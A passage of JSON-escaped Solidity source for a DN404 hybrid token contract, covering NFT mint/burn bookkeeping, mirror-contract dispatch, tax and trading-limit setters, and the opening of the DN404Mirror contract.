);\\r\\n\\r\\n            if (t.nftAmountToBurn != 0) {\\r\\n                Uint32Map storage fromOwned = $.owned[from];\\r\\n                uint256 fromIndex = t.fromOwnedLength;\\r\\n                uint256 fromEnd = fromIndex - t.nftAmountToBurn;\\r\\n                $.totalNFTSupply -= uint32(t.nftAmountToBurn);\\r\\n                fromAddressData.ownedLength = uint32(fromEnd);\\r\\n                // Burn loop.\\r\\n                do {\\r\\n                    uint256 id = _get(fromOwned, --fromIndex);\\r\\n                    _setOwnerAliasAndOwnedIndex($.oo, id, 0, 0);\\r\\n                    delete $.tokenApprovals[id];\\r\\n                    _packedLogsAppend(packedLogs, from, id, 1);\\r\\n                } while (fromIndex != fromEnd);\\r\\n            }\\r\\n\\r\\n            if (t.nftAmountToMint != 0) {\\r\\n                Uint32Map storage toOwned = $.owned[to];\\r\\n                uint256 toIndex = t.toOwnedLength;\\r\\n                uint256 toEnd = toIndex + t.nftAmountToMint;\\r\\n                uint32 toAlias = _registerAndResolveAlias(toAddressData, to);\\r\\n                uint256 maxNFTId = $.totalSupply / _WAD;\\r\\n                uint256 id = $.nextTokenId;\\r\\n                $.totalNFTSupply += uint32(t.nftAmountToMint);\\r\\n                toAddressData.ownedLength = uint32(toEnd);\\r\\n                // Mint loop.\\r\\n                do {\\r\\n                    while (_get($.oo, _ownershipIndex(id)) != 0) {\\r\\n                        if (++id \\u003e maxNFTId) id = 1;\\r\\n                    }\\r\\n                    _set(toOwned, toIndex, uint32(id));\\r\\n                    _setOwnerAliasAndOwnedIndex(\\r\\n                        $.oo,\\r\\n                        id,\\r\\n                        toAlias,\\r\\n                        uint32(toIndex++)\\r\\n                    );\\r\\n                    _packedLogsAppend(packedLogs, to, id, 0);\\r\\n                    if (++id \\u003e maxNFTId) id = 1;\\r\\n                } while (toIndex != toEnd);\\r\\n                $.nextTokenId = uint32(id);\\r\\n            }\\r\\n\\r\\n            if (packedLogs.logs.length != 0) {\\r\\n                _packedLogsSend(packedLogs, $.mirrorERC721);\\r\\n            }\\r\\n        }\\r\\n        emit Transfer(from, to, amount);\\r\\n    }\\r\\n\\r\\n    /// @dev Transfers token `id` from `from` to `to`.\\r\\n    ///\\r\\n    /// Requirements:\\r\\n    ///\\r\\n    /// - Call must originate from the mirror contract.\\r\\n    /// - Token `id` must exist.\\r\\n    /// - `from` must be the owner of the token.\\r\\n    /// - `to` cannot be the zero address.\\r\\n    ///   `msgSender` must be the owner of the token, or be approved to manage the token.\\r\\n    ///\\r\\n    /// Emits a {Transfer} event.\\r\\n    function _transferFromNFT(\\r\\n        address from,\\r\\n        address to,\\r\\n        uint256 id,\\r\\n        address msgSender\\r\\n    ) internal virtual {\\r\\n        DN404Storage storage $ = _getDN404Storage();\\r\\n\\r\\n        if (to == address(0)) revert TransferToZeroAddress();\\r\\n\\r\\n        address owner = $.aliasToAddress[_get($.oo, _ownershipIndex(id))];\\r\\n\\r\\n        if (from != owner) revert TransferFromIncorrectOwner();\\r\\n\\r\\n        if (msgSender != from) {\\r\\n            if (!$.operatorApprovals[from][msgSender]) {\\r\\n                if (msgSender != $.tokenApprovals[id]) {\\r\\n                    revert TransferCallerNotOwnerNorApproved();\\r\\n                }\\r\\n            }\\r\\n        }\\r\\n\\r\\n        AddressData storage fromAddressData = _addressData(from);\\r\\n        AddressData storage toAddressData = _addressData(to);\\r\\n\\r\\n        fromAddressData.balance -= uint96(_WAD);\\r\\n\\r\\n        unchecked {\\r\\n            toAddressData.balance += uint96(_WAD);\\r\\n\\r\\n            _set(\\r\\n                $.oo,\\r\\n                _ownershipIndex(id),\\r\\n                _registerAndResolveAlias(toAddressData, to)\\r\\n            );\\r\\n            delete $.tokenApprovals[id];\\r\\n\\r\\n            uint256 updatedId = _get(\\r\\n                $.owned[from],\\r\\n                --fromAddressData.ownedLength\\r\\n            );\\r\\n            _set($.owned[from], _get($.oo, _ownedIndex(id)), uint32(updatedId));\\r\\n\\r\\n            uint256 n = toAddressData.ownedLength++;\\r\\n            _set($.oo, _ownedIndex(updatedId), _get($.oo, _ownedIndex(id)));\\r\\n            _set($.owned[to], n, uint32(id));\\r\\n            _set($.oo, _ownedIndex(id), uint32(n));\\r\\n        }\\r\\n\\r\\n        emit Transfer(from, to, _WAD);\\r\\n    }\\r\\n\\r\\n    function _setTradingEnabled(bool enabled) internal {\\r\\n        DN404Storage storage $ = _getDN404Storage();\\r\\n        $.tradingEnabled = enabled;\\r\\n    }\\r\\n\\r\\n    function _setLimits(\\r\\n        bool enabled,\\r\\n        uint256 maxTokensAmountPerWallet\\r\\n    ) internal {\\r\\n        DN404Storage storage $ = _getDN404Storage();\\r\\n        $.limits = enabled;\\r\\n        $.maxTokensAmountPerWallet = maxTokensAmountPerWallet;\\r\\n    }\\r\\n\\r\\n    function _setTaxSettings(\\r\\n        address receiver,\\r\\n        uint256 swapThreeshold\\r\\n    ) internal {\\r\\n        DN404Storage storage $ = _getDN404Storage();\\r\\n        $.taxReceiver = receiver;\\r\\n        $.taxSwapThreeshold = swapThreeshold;\\r\\n    }\\r\\n\\r\\n    function _setSwapEnabled(bool enabled) internal {\\r\\n        DN404Storage storage $ = _getDN404Storage();\\r\\n        $.swapEnabled = enabled;\\r\\n    }\\r\\n\\r\\n    function _setTaxPair(address pair) internal {\\r\\n        DN404Storage storage $ = _getDN404Storage();\\r\\n        $.pair = pair;\\r\\n    }\\r\\n\\r\\n    function _setTaxRates(uint256 buy, uint256 sell) internal {\\r\\n        DN404Storage storage $ = _getDN404Storage();\\r\\n        $.taxBuy = buy;\\r\\n        $.taxSell = sell;\\r\\n    }\\r\\n\\r\\n    modifier lockTheSwap() {\\r\\n        DN404Storage storage $ = _getDN404Storage();\\r\\n        $.inSwap = true;\\r\\n        _;\\r\\n        $.inSwap = false;\\r\\n    }\\r\\n\\r\\n    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {\\r\\n        DN404Storage storage $ = _getDN404Storage();\\r\\n        address[] memory path = new address[](2);\\r\\n        path[0] = address(this);\\r\\n        path[1] = UNISWAP_V2_ROUTER.WETH();\\r\\n        $.allowance[address(this)][address(UNISWAP_V2_ROUTER)] = tokenAmount;\\r\\n        UNISWAP_V2_ROUTER.swapExactTokensForETHSupportingFeeOnTransferTokens(\\r\\n            tokenAmount,\\r\\n            0,\\r\\n            path,\\r\\n            address($.taxReceiver),\\r\\n            block.timestamp\\r\\n        );\\r\\n    }\\r\\n\\r\\n    function getExcludedFromFee(address a) public view virtual returns (bool) {\\r\\n        AddressData storage d = _getDN404Storage().addressData[a];\\r\\n        if (d.flags \\u0026 _ADDRESS_DATA_INITIALIZED_FLAG == 0) return _hasCode(a);\\r\\n        return d.flags \\u0026 _ADDRESS_DATA_EXCLUDED_FROM_FEE_FLAG != 0;\\r\\n    }\\r\\n\\r\\n    function _setExcludedFromFee(address a, bool state) internal virtual {\\r\\n        AddressData storage d = _addressData(a);\\r\\n        if ((d.flags \\u0026 _ADDRESS_DATA_EXCLUDED_FROM_FEE_FLAG != 0) != state) {\\r\\n            d.flags ^= _ADDRESS_DATA_EXCLUDED_FROM_FEE_FLAG;\\r\\n        }\\r\\n    }\\r\\n\\r\\n    /*\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-*/\\r\\n    /*                 DATA HITCHHIKING FUNCTIONS                 */\\r\\n    /*-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb*/\\r\\n\\r\\n    /// @dev Returns the auxiliary data for `owner`.\\r\\n    /// Minting, transferring, burning the tokens of `owner` will not change the auxiliary data.\\r\\n    /// Auxiliary data can be set for any address, even if it does not have any tokens.\\r\\n    function _getAux(address owner) internal view virtual returns (uint88) {\\r\\n        return _getDN404Storage().addressData[owner].aux;\\r\\n    }\\r\\n\\r\\n    /// @dev Set the auxiliary data for `owner` to `value`.\\r\\n    /// Minting, transferring, burning the tokens of `owner` will not change the auxiliary data.\\r\\n    /// Auxiliary data can be set for any address, even if it does not have any tokens.\\r\\n    function _setAux(address owner, uint88 value) internal virtual {\\r\\n        _getDN404Storage().addressData[owner].aux = value;\\r\\n    }\\r\\n\\r\\n    /*\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-*/\\r\\n    /*                     SKIP NFT FUNCTIONS                     */\\r\\n    /*-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb*/\\r\\n\\r\\n    /// @dev Returns true if account `a` will skip NFT minting on token mints and transfers.\\r\\n    /// Returns false if account `a` will mint NFTs on token mints and transfers.\\r\\n    function getSkipNFT(address a) public view virtual returns (bool) {\\r\\n        AddressData storage d = _getDN404Storage().addressData[a];\\r\\n        if (d.flags \\u0026 _ADDRESS_DATA_INITIALIZED_FLAG == 0) return _hasCode(a);\\r\\n        return d.flags \\u0026 _ADDRESS_DATA_SKIP_NFT_FLAG != 0;\\r\\n    }\\r\\n\\r\\n    /// @dev Internal function to set account `a` skipNFT flag to `state`\\r\\n    ///\\r\\n    /// Initializes account `a` AddressData if it is not currently initialized.\\r\\n    ///\\r\\n    /// Emits a {SkipNFTSet} event.\\r\\n    function _setSkipNFT(address a, bool state) internal virtual {\\r\\n        AddressData storage d = _addressData(a);\\r\\n        if ((d.flags \\u0026 _ADDRESS_DATA_SKIP_NFT_FLAG != 0) != state) {\\r\\n            d.flags ^= _ADDRESS_DATA_SKIP_NFT_FLAG;\\r\\n        }\\r\\n        emit SkipNFTSet(a, state);\\r\\n    }\\r\\n\\r\\n    /// @dev Returns a storage data pointer for account `a` AddressData\\r\\n    ///\\r\\n    /// Initializes account `a` AddressData if it is not currently initialized.\\r\\n    function _addressData(\\r\\n        address a\\r\\n    ) internal virtual returns (AddressData storage d) {\\r\\n        DN404Storage storage $ = _getDN404Storage();\\r\\n        d = $.addressData[a];\\r\\n\\r\\n        if (d.flags \\u0026 _ADDRESS_DATA_INITIALIZED_FLAG == 0) {\\r\\n            uint8 flags = _ADDRESS_DATA_INITIALIZED_FLAG;\\r\\n            if (_hasCode(a)) flags |= _ADDRESS_DATA_SKIP_NFT_FLAG;\\r\\n            d.flags = flags;\\r\\n        }\\r\\n    }\\r\\n\\r\\n    /// @dev Returns the `addressAlias` of account `to`.\\r\\n    ///\\r\\n    /// Assigns and registers the next alias if `to` alias was not previously registered.\\r\\n    function _registerAndResolveAlias(\\r\\n        AddressData storage toAddressData,\\r\\n        address to\\r\\n    ) internal virtual returns (uint32 addressAlias) {\\r\\n        DN404Storage storage $ = _getDN404Storage();\\r\\n        addressAlias = toAddressData.addressAlias;\\r\\n        if (addressAlias == 0) {\\r\\n            addressAlias = ++$.numAliases;\\r\\n            toAddressData.addressAlias = addressAlias;\\r\\n            $.aliasToAddress[addressAlias] = to;\\r\\n        }\\r\\n    }\\r\\n\\r\\n    /*\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-*/\\r\\n    /*                     MIRROR OPERATIONS                      */\\r\\n    /*-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb*/\\r\\n\\r\\n    /// @dev Returns the address of the mirror NFT contract.\\r\\n    function mirrorERC721() public view virtual returns (address) {\\r\\n        return _getDN404Storage().mirrorERC721;\\r\\n    }\\r\\n\\r\\n    /// @dev Returns the total NFT supply.\\r\\n    function _totalNFTSupply() internal view virtual returns (uint256) {\\r\\n        return _getDN404Storage().totalNFTSupply;\\r\\n    }\\r\\n\\r\\n    /// @dev Returns `owner` NFT balance.\\r\\n    function _balanceOfNFT(\\r\\n        address owner\\r\\n    ) internal view virtual returns (uint256) {\\r\\n        return _getDN404Storage().addressData[owner].ownedLength;\\r\\n    }\\r\\n\\r\\n    /// @dev Returns the owner of token `id`.\\r\\n    /// Returns the zero address instead of reverting if the token does not exist.\\r\\n    function _ownerAt(uint256 id) internal view virtual returns (address) {\\r\\n        DN404Storage storage $ = _getDN404Storage();\\r\\n        return $.aliasToAddress[_get($.oo, _ownershipIndex(id))];\\r\\n    }\\r\\n\\r\\n    /// @dev Returns the owner of token `id`.\\r\\n    ///\\r\\n    /// Requirements:\\r\\n    /// - Token `id` must exist.\\r\\n    function _ownerOf(uint256 id) internal view virtual returns (address) {\\r\\n        if (!_exists(id)) revert TokenDoesNotExist();\\r\\n        return _ownerAt(id);\\r\\n    }\\r\\n\\r\\n    /// @dev Returns if token `id` exists.\\r\\n    function _exists(uint256 id) internal view virtual returns (bool) {\\r\\n        return _ownerAt(id) != address(0);\\r\\n    }\\r\\n\\r\\n    /// @dev Returns the account approved to manage token `id`.\\r\\n    ///\\r\\n    /// Requirements:\\r\\n    /// - Token `id` must exist.\\r\\n    function _getApproved(uint256 id) internal view virtual returns (address) {\\r\\n        if (!_exists(id)) revert TokenDoesNotExist();\\r\\n        return _getDN404Storage().tokenApprovals[id];\\r\\n    }\\r\\n\\r\\n    /// @dev Sets `spender` as the approved account to manage token `id`, using `msgSender`.\\r\\n    ///\\r\\n    /// Requirements:\\r\\n    /// - `msgSender` must be the owner or an approved operator for the token owner.\\r\\n    function _approveNFT(\\r\\n        address spender,\\r\\n        uint256 id,\\r\\n        address msgSender\\r\\n    ) internal virtual returns (address) {\\r\\n        DN404Storage storage $ = _getDN404Storage();\\r\\n\\r\\n        address owner = $.aliasToAddress[_get($.oo, _ownershipIndex(id))];\\r\\n\\r\\n        if (msgSender != owner) {\\r\\n            if (!$.operatorApprovals[owner][msgSender]) {\\r\\n                revert ApprovalCallerNotOwnerNorApproved();\\r\\n            }\\r\\n        }\\r\\n\\r\\n        $.tokenApprovals[id] = spender;\\r\\n\\r\\n        return owner;\\r\\n    }\\r\\n\\r\\n    /// @dev Approve or remove the `operator` as an operator for `msgSender`,\\r\\n    /// without authorization checks.\\r\\n    function _setApprovalForAll(\\r\\n        address operator,\\r\\n        bool approved,\\r\\n        address msgSender\\r\\n    ) internal virtual {\\r\\n        _getDN404Storage().operatorApprovals[msgSender][operator] = approved;\\r\\n    }\\r\\n\\r\\n    /// @dev Calls the mirror contract to link it to this contract.\\r\\n    ///\\r\\n    /// Reverts if the call to the mirror contract reverts.\\r\\n    function _linkMirrorContract(address mirror) internal virtual {\\r\\n        /// @solidity memory-safe-assembly\\r\\n        assembly {\\r\\n            mstore(0x00, 0x0f4599e5) // `linkMirrorContract(address)`.\\r\\n            mstore(0x20, caller())\\r\\n            if iszero(\\r\\n                and(\\r\\n                    eq(mload(0x00), 1),\\r\\n                    call(gas(), mirror, 0, 0x1c, 0x24, 0x00, 0x20)\\r\\n                )\\r\\n            ) {\\r\\n                mstore(0x00, 0xd125259c) // `LinkMirrorContractFailed()`.\\r\\n                revert(0x1c, 0x04)\\r\\n            }\\r\\n        }\\r\\n    }\\r\\n\\r\\n    /// @dev Fallback modifier to dispatch calls from the mirror NFT contract\\r\\n    /// to internal functions in this contract.\\r\\n    modifier dn404Fallback() virtual {\\r\\n        DN404Storage storage $ = _getDN404Storage();\\r\\n\\r\\n        uint256 fnSelector = _calldataload(0x00) \\u003e\\u003e 224;\\r\\n\\r\\n        // `isApprovedForAll(address,address)`.\\r\\n        if (fnSelector == 0xe985e9c5) {\\r\\n            if (msg.sender != $.mirrorERC721) revert SenderNotMirror();\\r\\n            if (msg.data.length \\u003c 0x44) revert();\\r\\n\\r\\n            address owner = address(uint160(_calldataload(0x04)));\\r\\n            address operator = address(uint160(_calldataload(0x24)));\\r\\n\\r\\n            _return($.operatorApprovals[owner][operator] ? 1 : 0);\\r\\n        }\\r\\n        // `ownerOf(uint256)`.\\r\\n        if (fnSelector == 0x6352211e) {\\r\\n            if (msg.sender != $.mirrorERC721) revert SenderNotMirror();\\r\\n            if (msg.data.length \\u003c 0x24) revert();\\r\\n\\r\\n            uint256 id = _calldataload(0x04);\\r\\n\\r\\n            _return(uint160(_ownerOf(id)));\\r\\n        }\\r\\n        // `transferFromNFT(address,address,uint256,address)`.\\r\\n        if (fnSelector == 0xe5eb36c8) {\\r\\n            if (msg.sender != $.mirrorERC721) revert SenderNotMirror();\\r\\n            if (msg.data.length \\u003c 0x84) revert();\\r\\n\\r\\n            address from = address(uint160(_calldataload(0x04)));\\r\\n            address to = address(uint160(_calldataload(0x24)));\\r\\n            uint256 id = _calldataload(0x44);\\r\\n            address msgSender = address(uint160(_calldataload(0x64)));\\r\\n\\r\\n            _transferFromNFT(from, to, id, msgSender);\\r\\n            _return(1);\\r\\n        }\\r\\n        // `setApprovalForAll(address,bool,address)`.\\r\\n        if (fnSelector == 0x813500fc) {\\r\\n            if (msg.sender != $.mirrorERC721) revert SenderNotMirror();\\r\\n            if (msg.data.length \\u003c 0x64) revert();\\r\\n\\r\\n            address spender = address(uint160(_calldataload(0x04)));\\r\\n            bool status = _calldataload(0x24) != 0;\\r\\n            address msgSender = address(uint160(_calldataload(0x44)));\\r\\n\\r\\n            _setApprovalForAll(spender, status, msgSender);\\r\\n            _return(1);\\r\\n        }\\r\\n        // `approveNFT(address,uint256,address)`.\\r\\n        if (fnSelector == 0xd10b6e0c) {\\r\\n            if (msg.sender != $.mirrorERC721) revert SenderNotMirror();\\r\\n            if (msg.data.length \\u003c 0x64) revert();\\r\\n\\r\\n            address spender = address(uint160(_calldataload(0x04)));\\r\\n            uint256 id = _calldataload(0x24);\\r\\n            address msgSender = address(uint160(_calldataload(0x44)));\\r\\n\\r\\n            _return(uint160(_approveNFT(spender, id, msgSender)));\\r\\n        }\\r\\n        // `getApproved(uint256)`.\\r\\n        if (fnSelector == 0x081812fc) {\\r\\n            if (msg.sender != $.mirrorERC721) revert SenderNotMirror();\\r\\n            if (msg.data.length \\u003c 0x24) revert();\\r\\n\\r\\n            uint256 id = _calldataload(0x04);\\r\\n\\r\\n            _return(uint160(_getApproved(id)));\\r\\n        }\\r\\n        // `balanceOfNFT(address)`.\\r\\n        if (fnSelector == 0xf5b100ea) {\\r\\n            if (msg.sender != $.mirrorERC721) revert SenderNotMirror();\\r\\n            if (msg.data.length \\u003c 0x24) revert();\\r\\n\\r\\n            address owner = address(uint160(_calldataload(0x04)));\\r\\n\\r\\n            _return(_balanceOfNFT(owner));\\r\\n        }\\r\\n        // `totalNFTSupply()`.\\r\\n        if (fnSelector == 0xe2c79281) {\\r\\n            if (msg.sender != $.mirrorERC721) revert SenderNotMirror();\\r\\n            if (msg.data.length \\u003c 0x04) revert();\\r\\n\\r\\n            _return(_totalNFTSupply());\\r\\n        }\\r\\n        // `implementsDN404()`.\\r\\n        if (fnSelector == 0xb7a94eb8) {\\r\\n            _return(1);\\r\\n        }\\r\\n        _;\\r\\n    }\\r\\n\\r\\n    /// @dev Fallback function for calls from mirror NFT contract.\\r\\n    fallback() external payable virtual dn404Fallback {}\\r\\n\\r\\n    receive() external payable virtual {}\\r\\n\\r\\n    /*\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-*/\\r\\n    /*                      PRIVATE HELPERS                       */\\r\\n    /*-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb*/\\r\\n\\r\\n    /// @dev Struct containing packed log data for `Transfer` events to be\\r\\n    /// emitted by the mirror NFT contract.\\r\\n    struct _PackedLogs {\\r\\n        uint256[] logs;\\r\\n        uint256 offset;\\r\\n    }\\r\\n\\r\\n    /// @dev Initiates memory allocation for packed logs with `n` log items.\\r\\n    function _packedLogsMalloc(\\r\\n        uint256 n\\r\\n    ) private pure returns (_PackedLogs memory p) {\\r\\n        /// @solidity memory-safe-assembly\\r\\n        assembly {\\r\\n            let logs := add(mload(0x40), 0x40) // Offset by 2 words for `_packedLogsSend`.\\r\\n            mstore(logs, n)\\r\\n            let offset := add(0x20, logs)\\r\\n            mstore(0x40, add(offset, shl(5, n)))\\r\\n            mstore(p, logs)\\r\\n            mstore(add(0x20, p), offset)\\r\\n        }\\r\\n    }\\r\\n\\r\\n    /// @dev Adds a packed log item to `p` with address `a`, token `id` and burn flag `burnBit`.\\r\\n    function _packedLogsAppend(\\r\\n        _PackedLogs memory p,\\r\\n        address a,\\r\\n        uint256 id,\\r\\n        uint256 burnBit\\r\\n    ) private pure {\\r\\n        /// @solidity memory-safe-assembly\\r\\n        assembly {\\r\\n            let offset := mload(add(0x20, p))\\r\\n            mstore(offset, or(or(shl(96, a), shl(8, id)), burnBit))\\r\\n            mstore(add(0x20, p), add(offset, 0x20))\\r\\n        }\\r\\n    }\\r\\n\\r\\n    /// @dev Calls the `mirror` NFT contract to emit Transfer events for packed logs `p`.\\r\\n    function _packedLogsSend(_PackedLogs memory p, address mirror) private {\\r\\n        /// @solidity memory-safe-assembly\\r\\n        assembly {\\r\\n            let logs := mload(p)\\r\\n            let o := sub(logs, 0x40) // Start of calldata to send.\\r\\n            mstore(o, 0x263c69d6) // `logTransfer(uint256[])`.\\r\\n            mstore(add(o, 0x20), 0x20) // Offset of `logs` in the calldata to send.\\r\\n            let n := add(0x44, shl(5, mload(logs))) // Length of calldata to send.\\r\\n            if iszero(\\r\\n                and(\\r\\n                    eq(mload(o), 1),\\r\\n                    call(gas(), mirror, 0, add(o, 0x1c), n, o, 0x20)\\r\\n                )\\r\\n            ) {\\r\\n                revert(o, 0x00)\\r\\n            }\\r\\n        }\\r\\n    }\\r\\n\\r\\n    /// @dev Struct of temporary variables for transfers.\\r\\n    struct _TransferTemps {\\r\\n        uint256 nftAmountToBurn;\\r\\n        uint256 nftAmountToMint;\\r\\n        uint256 fromBalance;\\r\\n        uint256 toBalance;\\r\\n        uint256 fromOwnedLength;\\r\\n        uint256 toOwnedLength;\\r\\n    }\\r\\n\\r\\n    /// @dev Returns if `a` has bytecode of non-zero length.\\r\\n    function _hasCode(address a) private view returns (bool result) {\\r\\n        /// @solidity memory-safe-assembly\\r\\n        assembly {\\r\\n            result := extcodesize(a) // Can handle dirty upper bits.\\r\\n        }\\r\\n    }\\r\\n\\r\\n    /// @dev Returns the calldata value at `offset`.\\r\\n    function _calldataload(\\r\\n        uint256 offset\\r\\n    ) private pure returns (uint256 value) {\\r\\n        /// @solidity memory-safe-assembly\\r\\n        assembly {\\r\\n            value := calldataload(offset)\\r\\n        }\\r\\n    }\\r\\n\\r\\n    /// @dev Executes a return opcode to return `x` and end the current call frame.\\r\\n    function _return(uint256 x) private pure {\\r\\n        /// @solidity memory-safe-assembly\\r\\n        assembly {\\r\\n            mstore(0x00, x)\\r\\n            return(0x00, 0x20)\\r\\n        }\\r\\n    }\\r\\n\\r\\n    /// @dev Returns `max(0, x - y)`.\\r\\n    function _zeroFloorSub(\\r\\n        uint256 x,\\r\\n        uint256 y\\r\\n    ) private pure returns (uint256 z) {\\r\\n        /// @solidity memory-safe-assembly\\r\\n        assembly {\\r\\n            z := mul(gt(x, y), sub(x, y))\\r\\n        }\\r\\n    }\\r\\n\\r\\n    /// @dev Returns `i \\u003c\\u003c 1`.\\r\\n    function _ownershipIndex(uint256 i) private pure returns (uint256) {\\r\\n        return i \\u003c\\u003c 1;\\r\\n    }\\r\\n\\r\\n    /// @dev Returns `(i \\u003c\\u003c 1) + 1`.\\r\\n    function _ownedIndex(uint256 i) private pure returns (uint256) {\\r\\n        unchecked {\\r\\n            return (i \\u003c\\u003c 1) + 1;\\r\\n        }\\r\\n    }\\r\\n\\r\\n    /// @dev Returns the uint32 value at `index` in `map`.\\r\\n    function _get(\\r\\n        Uint32Map storage map,\\r\\n        uint256 index\\r\\n    ) private view returns (uint32 result) {\\r\\n        result = uint32(map.map[index \\u003e\\u003e 3] \\u003e\\u003e ((index \\u0026 7) \\u003c\\u003c 5));\\r\\n    }\\r\\n\\r\\n    /// @dev Updates the uint32 value at `index` in `map`.\\r\\n    function _set(Uint32Map storage map, uint256 index, uint32 value) private {\\r\\n        /// @solidity memory-safe-assembly\\r\\n        assembly {\\r\\n            mstore(0x20, map.slot)\\r\\n            mstore(0x00, shr(3, index))\\r\\n            let s := keccak256(0x00, 0x40) // Storage slot.\\r\\n            let o := shl(5, and(index, 7)) // Storage slot offset (bits).\\r\\n            let v := sload(s) // Storage slot value.\\r\\n            let m := 0xffffffff // Value mask.\\r\\n            sstore(s, xor(v, shl(o, and(m, xor(shr(o, v), value)))))\\r\\n        }\\r\\n    }\\r\\n\\r\\n    /// @dev Sets the owner alias and the owned index together.\\r\\n    function _setOwnerAliasAndOwnedIndex(\\r\\n        Uint32Map storage map,\\r\\n        uint256 id,\\r\\n        uint32 ownership,\\r\\n        uint32 ownedIndex\\r\\n    ) private {\\r\\n        /// @solidity memory-safe-assembly\\r\\n        assembly {\\r\\n            let value := or(shl(32, ownedIndex), and(0xffffffff, ownership))\\r\\n            mstore(0x20, map.slot)\\r\\n            mstore(0x00, shr(2, id))\\r\\n            let s := keccak256(0x00, 0x40) // Storage slot.\\r\\n            let o := shl(6, and(id, 3)) // Storage slot offset (bits).\\r\\n            let v := sload(s) // Storage slot value.\\r\\n            let m := 0xffffffffffffffff // Value mask.\\r\\n            sstore(s, xor(v, shl(o, and(m, xor(shr(o, v), value)))))\\r\\n        }\\r\\n    }\\r\\n}\"},\"DN404Mirror.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\r\\npragma solidity ^0.8.4;\\r\\n\\r\\n/// @title DN404Mirror\\r\\n/// @notice DN404Mirror provides an interface for interacting with the\\r\\n/// NFT tokens in a DN404 implementation.\\r\\n///\\r\\n/// @author vectorized.eth (@optimizoor)\\r\\n/// @author Quit (@0xQuit)\\r\\n/// @author Michael Amadi (@AmadiMichaels)\\r\\n/// @author cygaar (@0xCygaar)\\r\\n/// @author Thomas (@0xjustadev)\\r\\n/// @author Harrison (@PopPunkOnChain)\\r\\n///\\r\\n/// @dev Note:\\r\\n/// - The ERC721 data is stored in the base DN404 contract.\\r\\ncontract DN404Mirror {\\r\\n    /*\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-*/\\r\\n    /*                           EVENTS                           */\\r\\n    /*-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb*/\\r\\n\\r\\n    /// @dev Emitted when token `id` is transferred from `from` to `to`.\\r\\n    event Transfer(\\r\\n        address indexed from,\\r\\n        address indexed to,\\r\\n        uint256 indexed id\\r\\n    );\\r\\n\\r\\n    /// @dev Emitted when `owner` enables `account` to manage the `id` token.\\r\\n    event Approval(\\r\\n        address indexed owner,\\r\\n        address indexed account,\\r\\n        uint256 indexed id\\r\\n    );\\r\\n\\r\\n    /// @dev Emitted when `owner` enables or disables `operator` to manage all of their tokens.\\r\\n    event ApprovalForAll(\\r\\n        address indexed owner,\\r\\n        address indexed operator,\\r\\n        bool isApproved\\r\\n    );\\r\\n\\r\\n    /// @dev `keccak256(bytes(\\\"Transfer(address,address,uint256)\\\"))`.\\r\\n    uint256 private constant _TRANSFER_EVENT_SIGNATURE =\\r\\n        0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef;\\r\\n\\r\\n    /// @dev `keccak256(bytes(\\\"Approval(address,address,uint256)\\\"))`.\\r\\n    uint256 private constant _APPROVAL_EVENT_SIGNATURE 